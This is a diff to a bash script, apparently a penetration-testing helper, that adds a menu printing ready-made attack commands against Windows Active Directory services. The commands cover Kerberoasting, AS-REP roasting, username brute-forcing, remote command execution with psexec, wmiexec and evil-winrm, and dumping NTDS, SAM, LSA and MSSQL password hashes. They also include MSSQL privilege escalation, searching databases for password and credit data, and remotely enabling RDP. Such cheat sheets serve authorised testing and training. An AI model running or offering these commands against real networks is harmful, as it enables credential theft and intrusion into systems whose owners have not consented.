@@ -22,6 +22,13 @@ MainCheck="1"			#
 
 
 ################################################################################
+# Wordlists                                                                    #
+################################################################################
+
+UserList="'/usr/share/seclists/Usernames/Names/names.txt'"
+UserListXato="'/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'"
+
+################################################################################
 # Colors                                                                       #
 ################################################################################
 
@@ -1536,6 +1543,578 @@ echo -ne  "Return to Previous Menu?
 
 }
 
+External_Menu_Main(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ BloodHound	]
+	2)  ->	[ DNS 		]
+	3)  ->	[ Impacket	]
+	4)  ->	[ Kerberos	]
+	5)  ->	[ LDAP		]
+	6)  ->	[ MSSQL		]
+	7)  ->	[ NTP		]
+	8)  ->	[ Nmap		]
+	9)  ->	[ Pywerview	]
+	10) -> 	[ RDP		]
+	11) ->	[ SMB		]
+	12) ->	[ WinRM		]
+        
+"
+        read a
+        case $a in
+                1) 	External_Menu_BloodHound ;;
+                2)	External_Menu_DNS ;;
+                3)	External_Menu_Impacket ;;
+                4) 	External_Menu_Kerberos ;;
+                5)	External_Menu_LDAP ;;
+                6)	External_Menu_MSSQL ;;
+                7)	External_Menu_NTP ;;
+                8)	External_Menu_Nmap ;;
+                9)	External_Menu_Pyerview ;;
+                10)	External_Menu_RDP ;;
+                11)	External_Menu_SMB ;;
+                12)	External_Menu_WinRM ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+External_Menu_BloodHound(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}BloodHound${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}BloodHound Python${RESTORE}"
+echo -e "${LYELLOW}Install:${RESTORE}pip install bloodhound"
+echo -e ""
+echo -e "bloodhound-python -u $Username -p $Password -ns $IP -d $Domain -c All,LoggedOn"
+echo -e ""
+echo -e "${IBLUE}BloodHound Crackmapexec${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}bloodhound${RESTORE}"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+
+External_Menu_DNS(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}DNS${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn --script dns-brute --script-args dns-brute.threads=12 $Domain $IP"
+echo -e "nmap -Pn -n --script ""\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"\"" $IP"
+echo -e ""
+echo -e "${IBLUE}DNSenum${RESTORE}"
+echo -e "dnsenum --dnsserver $IP --enum $Domain"
+echo -e ""
+echo -e "${IBLUE}DNSrecon${RESTORE}"
+echo -e "dnsrecon -d $Domain"
+echo -e ""
+echo -e "${IBLUE}Dig${RESTORE}"
+echo -e "dig AXFR $Domain @$NQIP"
+echo -e "dig @$NQIP $Domain"
+echo -e "dig @$NQIP $Domain A"
+echo -e "dig @$NQIP $Domain AAAA"
+echo -e "dig @$NQIP $Domain MX"
+echo -e "dig @$NQIP $Domain NS"
+echo -e "dig @$NQIP $Domain PTR"
+echo -e ""
+echo -e "${IBLUE}Fierce${RESTORE}"
+echo -e "fierce -dns $Domain"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+}
+
+
+External_Menu_Impacket(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Impacket${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}GetADUsers${RESTORE}"
+echo -e "GetADUsers.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
+echo -e ""
+echo -e "${IBLUE}GetNPUsers${RESTORE}"
+echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'"
+echo -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'"
+echo -e ""
+echo -e "${IBLUE}GetUserSPNs${RESTORE}"
+echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP -request"
+echo -e ""
+echo -e "${IBLUE}lookupsid${RESTORE}"
+echo -e "lookupsid.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e ""
+echo -e "${IBLUE}samrdump${RESTORE}"
+echo -e "samrdump.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e ""
+echo -e "${IBLUE}services${RESTORE}"
+echo -e "services.py $NQDomain/$NQUsername:$Password@$IP list"
+echo -e ""
+echo -e "${IBLUE}Execution Methods${RESTORE}"
+echo -e "atexec.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e "psexec.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e "smbexec.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e "wmiexec.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+           
+}
+
+
+External_Menu_Kerberos(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Kerberos${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impacket${RESTORE}"
+echo -e "GetNPUsers.py $Domain/ -usersfile $UserList -dc-ip $IP -format 'hashcat'"
+echo -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'hashcat'"
+echo -e ""
+echo -e "${IBLUE}Kerbrute${RESTORE}"
+echo -e "kerbrute userenum $UserList --dc $IP --domain $Domain"
+echo -e "kerbrute userenum $UserListXato --dc $IP --domain $Domain"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=$Domain,userdb=$UserList $IP"
+echo -e ""
+echo -e "${IBLUE}Metasploit${RESTORE}"
+echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers;set rhost $IP;set DOMAIN $Domain;set USER_FILE $UserList;exploit'"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_LDAP(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}LDAP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap -Pn -n -sV --script "\"ldap* and not brute"\" $IP"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --admin-count"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --asreproast ASREPROAST"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --groups"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --kerberoasting KERBEROASTING"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --password-not-required"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --trusted-for-delegation"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --users"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M get-desc-users"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M laps"
+echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M ldap-signing"
+echo -e ""
+echo -e "${IBLUE}LDAPdomaindump${RESTORE}"
+echo -e "ldapdomaindump -u $NQDomain\\\\\\\\$NQUsername -p $Password ldap://$NQIP"
+echo -e ""
+echo -e "${IBLUE}LDAPsearch${RESTORE}"
+echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP""
+echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_MSSQL(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}MSSQL${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "sudo nmap -Pn -p 1433 --script=ms-sql-info.nse $IP"
+echo -e 
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -x whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
+echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -X whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impacket${RESTORE}"
+echo -e "mssqlclient.py -port 1433 $Username:$Password@$NQIP"
+echo -e ""
+echo -e "${IBLUE}Metasploit${RESTORE}"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping;set rhosts $IP ;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum_sql_login;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec;set rhosts $IP ;set username $Username;set password $Password;set command net user;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata ;set rhosts $IP ;set username $Username;set password $Password;set sample_size 4;set keywords FirstName|passw|credit; exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_sql;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_NTP(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}NTP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}NTPdate${RESTORE}"
+echo -e "sudo ntpdate $IP"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "sudo nmap -Pn -sU -p 123 --script ntp-info $IP"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+External_Menu_Nmap(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Nmap${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Quick Scans${RESTORE}"
+echo -n -e "nmap -Pn -sV --top-ports 50 --open $IP" ;echo -e " ${YELLOW}# Top 50 ports scan${RESTORE}"
+echo -n -e "nmap -Pn -sV --top-ports 100 --open $IP" ;echo -e " ${YELLOW}# Top 100 ports scan${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Intensive Scans${RESTORE}"
+echo -n -e "nmap -Pn -p- -sS -sV -sC -v $IP" ;echo -e " ${YELLOW}# Scan all ports, version checking, script scans${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Vulnerability Scans${RESTORE}"
+echo -n -e "nmap -Pn --script vulners -script-args mincvss=5.0 -p- -sV -v $IP" ;echo -e " ${YELLOW}# Full vuln scan${RESTORE}"
+echo -n -e "nmap -Pn --script smb-vuln* -p 139,445 -v $IP" ;echo -e " ${YELLOW}# SMB vuln scan${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Misc Scans${RESTORE}"
+echo -n -e "nmap -Pn -sU -sC -sV -v $IP # UDP Scan" ;echo -e " ${YELLOW}# UDP Scan${RESTORE}"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_Pyerview(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Pywerview${RESTORE}"
+echo -e ""
+echo -e "${LYELLOW}Link:${RESTORE}https://github.com/the-useless-one/pywerview"
+echo -e ""
+echo -e "${IBLUE}Information Gathering${RESTORE}"
+echo -e "python3 pywerview.py get-dfsshare -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-domainpolicy -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgroup -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/samaccountname: //' | sort"
+echo -e "python3 pywerview.py get-netcomputer -u $Username -p $Password -w $Domain --dc-ip $IP  | sed 's/dnshostname: //' | sort"
+echo -e "python3 pywerview.py get-netdomaincontroller -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netfileserver -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgpo -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netgpogroup -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py get-netou -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/distinguishedname: //' | sort"
+echo -e "python3 pywerview.py get-netsite -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/name: //' | sort"
+echo -e "python3 pywerview.py get-netuser -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e ""
+echo -e "${IBLUE}Hunting${RESTORE}"
+echo -e "python3 pywerview.py invoke-eventhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py invoke-processhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e "python3 pywerview.py invoke-userhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_RDP(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}RDP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -M rdp -o ACTION=enable" ;echo -e " ${YELLOW}# Enable RDP${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Impacket${RESTORE}"
+echo -e "rdp_check.py $NQDomain/$NQUsername:$Password@$IP"
+echo -e ""
+echo -e "${IBLUE}xFreeRDP${RESTORE}"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard"
+echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_SMB(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}SMB${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Nmap${RESTORE}"
+echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -Pn -p 139,445 $IP"
+echo -e ""
+echo -e "${IBLUE}nmblookup${RESTORE}"
+echo -e "nmblookup -A $IP"
+echo -e ""
+echo -e "${IBLUE}enum4linux${RESTORE}"
+echo -e "enum4linux -u $Username -p $Password -r $IP -w $Domain| grep 'Local User'"
+echo -e ""
+echo -e "${IBLUE}SMBmap${RESTORE}"
+echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain"
+echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R"
+echo -n -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R -A .zip";echo -e " ${YELLOW}  # Pattern match, download files${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}SMBclient${RESTORE}"
+echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP -W $Domain"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --disks"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --local-groups"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --lsa"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --pass-pol"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --rid-brute"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sam"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sessions"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --shares"
+echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --users"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
+echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
+External_Menu_WinRM(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}WinRM${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Crackmapexec${RESTORE}"
+echo -e "crackmapexec winrm $IP -u $Username -p $Password"
+echo -e ""
+echo -e "${IBLUE}Evil-WinRM${RESTORE}"
+echo -e "evil-winrm -i $IP -u $Username -p $Password"
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+
 
 Main_Menu(){
 
@@ -1550,6 +2129,7 @@ echo -ne "
         read a
         case $a in
 	        1) Internal_Menu_Main ;;
+	        2) External_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
